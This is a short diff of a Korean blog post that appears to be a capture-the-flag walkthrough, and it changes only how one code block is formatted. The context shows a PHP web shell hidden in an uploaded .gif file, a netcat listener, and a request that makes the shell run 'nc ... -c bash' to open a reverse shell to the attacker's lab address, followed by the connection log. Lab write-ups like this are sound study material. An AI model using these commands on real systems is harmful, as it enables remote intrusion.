@@ -92,7 +92,11 @@ system( $_GET[cmd] );
 <p>웹 쉘을 탈취하기 위해 필자(공격자) PC에서 netcat 리스닝 2021 포트를 열었다.</p>
 
 <p>이제 올려놓은 악성코드를 이용하여 리버스 쉘을 연결하면.</p>
-<code>http://10.10.10.146/uploads/10_10_12_226.gif?cmd=nc 10.10.12.226 2021 -c bash</code>
+
+```
+http://10.10.10.146/uploads/10_10_12_226.gif?cmd=nc 10.10.12.226 2021 -c bash
+```
+
 <br>
 <code>Connection from 10.10.10.146:41584</code>
 <p>떳다.</p>
